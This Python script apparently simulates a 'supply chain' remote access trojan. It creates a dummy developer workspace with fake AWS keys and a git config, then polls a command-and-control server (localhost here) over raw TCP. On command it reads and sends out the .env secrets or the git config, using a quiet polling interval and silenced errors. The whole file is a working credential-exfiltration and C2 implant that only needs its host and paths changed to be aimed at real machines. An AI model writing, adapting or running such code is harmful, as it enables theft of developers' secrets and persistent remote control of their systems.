import socket
import time
import os
import threading

C2_HOST = '127.0.0.1'
C2_PORT = 8081
AGENT_ID = 'AGENT_001'

WORKSPACE_DIR = "target_workspace"


def setup_dummy_env():
    """Creates a simulated developer workspace"""
    os.makedirs(WORKSPACE_DIR, exist_ok=True)
    with open(f"{WORKSPACE_DIR}/.env", "w") as f:
        f.write("AWS_SECRET_KEY=AKIA_STOLEN_EXAMPLE\nDB_PASS=admin123")
    os.makedirs(f"{WORKSPACE_DIR}/.git", exist_ok=True)
    with open(f"{WORKSPACE_DIR}/.git/config", "w") as f:
        f.write("url = https://github.com/company/secret_repo.git")


def send_payload(payload_dict):
    """Raw TCP transmission"""
    try:
        # Native JSON formatting
        json_str = "{"
        for k, v in payload_dict.items():
            json_str += f'"{k}":"{v}",'
        json_str = json_str.rstrip(',') + "}\n"

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((C2_HOST, C2_PORT))
            s.sendall(json_str.encode('utf-8'))

            # If polling, wait for response
            if payload_dict.get("action") == "POLL":
                response = s.recv(1024).decode('utf-8')
                return response
    except Exception as e:
        pass
    return None


def heartbeat_and_poll():
    """Background thread that keeps the RAT alive and fetches commands"""
    while True:
        # 1. Send Heartbeat
        send_payload({"action": "HEARTBEAT", "agent_id": AGENT_ID})

        # 2. Poll the SQL Command Queue via Java
        response = send_payload({"action": "POLL", "agent_id": AGENT_ID})

        if response and '"cmd":"STEAL_SECRETS"' in response:
            print("[RAT] Command received: Stealing .env file...")
            try:
                with open(f"{WORKSPACE_DIR}/.env", "r") as f:
                    data = f.read().replace('\n', ' | ')
                    send_payload({"action": "EXFIL", "agent_id": AGENT_ID, "file": ".env", "data": data})
            except:
                pass

        elif response and '"cmd":"STEAL_GIT"' in response:
            print("[RAT] Command received: Stealing .git/config...")
            try:
                with open(f"{WORKSPACE_DIR}/.git/config", "r") as f:
                    data = f.read().replace('\n', ' | ')
                    send_payload({"action": "EXFIL", "agent_id": AGENT_ID, "file": ".git/config", "data": data})
            except:
                pass

        time.sleep(3)  # Low and slow polling interval


if __name__ == "__main__":
    print("--- VORTEX ADVANCED: Supply Chain RAT ---")
    setup_dummy_env()
    print("[SYSTEM] Embedded inside VS Code. Establishing persistent C2 connection...")

    # Start persistent polling mechanism
    threading.Thread(target=heartbeat_and_poll, daemon=True).start()

    # Keep alive
    while True:
        time.sleep(1)